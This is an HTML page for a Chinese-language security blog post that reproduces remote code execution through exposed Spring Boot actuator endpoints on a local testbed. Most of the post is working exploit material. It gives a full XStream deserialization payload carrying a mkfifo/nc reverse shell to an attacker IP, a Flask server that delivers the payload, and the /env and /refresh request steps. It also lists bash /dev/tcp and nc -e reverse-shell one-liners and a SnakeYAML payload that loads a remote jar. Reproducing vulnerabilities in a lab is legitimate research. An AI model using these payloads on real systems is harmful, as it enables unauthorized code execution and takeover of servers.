@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="漏洞复现,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="背景SpringBoot应用最常见最广为人知的无非是监控actuator泄漏">
+<meta name="keywords" content="漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring Boot RCE 漏洞复现">
+<meta property="og:url" content="http://yoursite.com/2019/09/30/Spring-Boot-RCE-漏洞复现/index.html">
+<meta property="og:site_name" content="Eight Dimensions">
+<meta property="og:description" content="背景SpringBoot应用最常见最广为人知的无非是监控actuator泄漏">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2019/09/30/Spring-Boot-RCE-漏洞复现/image-20190930011413187.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/30/Spring-Boot-RCE-漏洞复现/image-20190930011545345.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/30/Spring-Boot-RCE-漏洞复现/image-20190930010735948.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/30/Spring-Boot-RCE-漏洞复现/image-20190930052917364.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/30/Spring-Boot-RCE-漏洞复现/image-20190930053020866.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/30/Spring-Boot-RCE-漏洞复现/image-20190930051819864.png">
+<meta property="og:updated_time" content="2019-09-30T15:00:31.028Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Spring Boot RCE 漏洞复现">
+<meta name="twitter:description" content="背景SpringBoot应用最常见最广为人知的无非是监控actuator泄漏">
+<meta name="twitter:image" content="http://yoursite.com/2019/09/30/Spring-Boot-RCE-漏洞复现/image-20190930011413187.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/30/Spring-Boot-RCE-漏洞复现/">
+
+
+
+
+
+  <title>Spring Boot RCE 漏洞复现 | Eight Dimensions</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Eight Dimensions</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/30/Spring-Boot-RCE-漏洞复现/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shad0w">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eight Dimensions">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Spring Boot RCE 漏洞复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-30T22:51:34+08:00">
+                2019-09-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>SpringBoot应用最常见最广为人知的无非是监控actuator泄漏</p>
+<a id="more"></a>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/autoconfig			提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过</span><br><span class="line">/beans					描述应用程序上下文里全部的Bean，以及它们的关系</span><br><span class="line">/env						获取全部环境属性</span><br><span class="line">/configprops		描述配置属性(包含默认值)如何注入Bean</span><br><span class="line">/dump						获取线程活动的快照</span><br><span class="line">/health					报告应用程序的健康指标，这些值由HealthIndicator的实现类提供</span><br><span class="line">/info						获取应用程序的定制信息，这些信息由info打头的属性提供</span><br><span class="line">/mappings				描述全部的URI路径，以及它们和控制器(包含Actuator端点)的映射关系</span><br><span class="line">/metrics				报告各种应用程序度量信息，比如内存用量和HTTP请求计数</span><br><span class="line">/shutdown				关闭应用程序，要求endpoints.shutdown.enabled设置为true</span><br><span class="line">/trace					提供基本的HTTP请求跟踪信息(时间戳、HTTP头等)</span><br></pre></td></tr></table></figure>
+
+<p>但是后面HW过程中大佬提醒才发现Springboot actuator泄漏有些场景下还可以直接RCE，感觉错过了很多RCE</p>
+<p>果然信息差还是很重要的，别人已经拿这个洞日天日地了收割了各种RCE我才后知后觉</p>
+<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p><a href="https://github.com/artsploit/actuator-testbed" target="_blank" rel="noopener">https://github.com/artsploit/actuator-testbed</a></p>
+<p>把项目clone下来之后idea打开pom.xml文件等项目依赖安装完之后直接运行就好了</p>
+<p>但是我这边可能是因为端口占用的缘故一开始怎么都跑不起来，后来修改了端口<code>application.properties</code>下的<code>server.port</code>为别的端口就没问题了。</p>
+<p>虽然项目运行过程会有报错但实际上不影响漏洞复现</p>
+<p>报错信息 <code>[main] ERROR c.n.d.s.t.d.RedirectingEurekaHttpClient - Request execution error</code></p>
+<h2 id="Eureka-Client"><a href="#Eureka-Client" class="headerlink" title="Eureka-Client"></a>Eureka-Client</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>Eureka-Client &lt;1.8.7（多见于Spring Cloud Netflix）</p>
+<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><ul>
+<li><p>创建xstream文件，搭建一个简易web服务</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">linked-hash-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">"javax.crypto.CipherInputStream"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">"javax.crypto.NullCipher"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"java.util.Collections$EmptyIterator"</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;amp;1|nc 172.20.10.3 7777 &gt; /tmp/f<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">redirectErrorStream</span>&gt;</span>false<span class="tag">&lt;/<span class="name">redirectErrorStream</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">next</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.ImageIO$ContainsFilter"</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span>3</span><br><span class="line">                    <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">name</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"string"</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">next</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">lock</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder$NullInputStream"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">linked-hash-set</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中string插入的是反弹shell语句</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;amp;1|nc 172.20.10.3 7777 &gt; /tmp/f<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里我使用Flask起一个简单的服务</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', defaults=&#123;'path': ''&#125;)</span></span><br><span class="line"><span class="meta">@app.route('/&lt;path:path&gt;', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span><span class="params">(path)</span>:</span></span><br><span class="line">    xml = <span class="string">"""</span></span><br><span class="line"><span class="string">			&lt;linked-hash-set&gt;</span></span><br><span class="line"><span class="string">  		&lt;/linked-hash-set&gt;"""</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">'application/xml'</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">2333</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在攻击机上开启端口监听</p>
+<p><code>nc -lvp 777</code></p>
+</li>
+</ul>
+<ul>
+<li><p>写入配置和刷新</p>
+<p>POST /env请求并重新赋值eureka.client.serviceUrl.defaultZone=<a href="http://127.0.0.1:2333/xstream" target="_blank" rel="noopener">http://127.0.0.1:2333/xstream</a></p>
+<p><img src="image-20190930011413187.png" alt="image-20190930011413187"></p>
+<p>看到响应成功后POST /refresh，请求过程会稍微停顿一下</p>
+<p><img src="image-20190930011545345.png" alt="image-20190930011545345"></p>
+<p>这里会遇到一些坑稍微提一下。</p>
+<p>因为我用的是mac电脑跑的SpringBoot项目意味着mac作为靶机，也因为mac装了zsh导致弹shell不这么顺利。</p>
+<ul>
+<li><p>最常用的 bash反弹shell命令<code>bash -i &gt;&amp; /dev/tcp/attackerip/1234 0&gt;&amp;1</code> 似乎不能在zsh上面弹（具体原因我也没深究）</p>
+</li>
+<li><p>Mac 装的nc 不支持 -i参数，第二常用命令<code>nc -e /bin/sh attackerip 1234</code> 也不能直接用</p>
+</li>
+<li><p>最后网上找了一个替代不支持-i参数的nc弹shell命令 <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;amp;1|nc 172.20.10.3 7777 &gt; /tmp/f</code></p>
+</li>
+<li><p>&amp; 测试过程中如果不编码成<code>&amp;amp;</code>弹不了shell</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>最后成功弹shell了！</p>
+<p><img src="image-20190930010735948.png" alt="image-20190930010735948"></p>
+<h2 id="Spring-cloud-bootstrap"><a href="#Spring-cloud-bootstrap" class="headerlink" title="Spring cloud bootstrap"></a>Spring cloud bootstrap</h2><h3 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h3><ul>
+<li><p>创建config.yml文件，具体内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [&quot;http://127.0.0.1:2333/config.jar&quot;]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>构造config.jar ，参照：<a href="https://github.com/artsploit/yaml-payload，修改AwesomeScriptEngineFactory.java具体执行的命令" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload，修改AwesomeScriptEngineFactory.java具体执行的命令</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/artsploit/yaml-payload.git</span><br><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用python起一个web服务<code>python -m SimpleHTTPServer 2333</code></p>
+</li>
+<li><p>设置环境变量并refresh</p>
+<p><img src="image-20190930052917364.png" alt="image-20190930052917364"></p>
+<p><img src="image-20190930053020866.png" alt="image-20190930053020866"></p>
+</li>
+</ul>
+<p>虽然服务端返回500，但是计算器是弹了出来了</p>
+<p><img src="image-20190930051819864.png" alt="image-20190930051819864"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然是可以直接RCE，但是这个漏洞在利用过程中都需要修改环境配置，测试完毕后需要重新设置原来的环境变量再refresh，但是不能保证一定能还原，所以再测试过程中得小小心</p>
+<p>参考链接</p>
+<p><a href="http://www.jianfensec.com/70.html" target="_blank" rel="noopener">http://www.jianfensec.com/70.html</a></p>
+<p><a href="https://jkme.github.io/pages/reverse-shell.html" target="_blank" rel="noopener">https://jkme.github.io/pages/reverse-shell.html</a></p>
+<p><a href="https://xz.aliyun.com/t/2233" target="_blank" rel="noopener">https://xz.aliyun.com/t/2233</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞复现/" rel="tag"># 漏洞复现</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/25/泛微OA命令执行浅析/" rel="next" title="泛微OA命令执行浅析">
+                <i class="fa fa-chevron-left"></i> 泛微OA命令执行浅析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Shad0w</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/PeteLing" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#背景"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现环境"><span class="nav-number">2.</span> <span class="nav-text">复现环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Eureka-Client"><span class="nav-number">3.</span> <span class="nav-text">Eureka-Client</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前提条件"><span class="nav-number">3.1.</span> <span class="nav-text">前提条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#复现过程"><span class="nav-number">3.2.</span> <span class="nav-text">复现过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Spring-cloud-bootstrap"><span class="nav-number">4.</span> <span class="nav-text">Spring cloud bootstrap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#复现过程-1"><span class="nav-number">4.1.</span> <span class="nav-text">复现过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shad0w</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
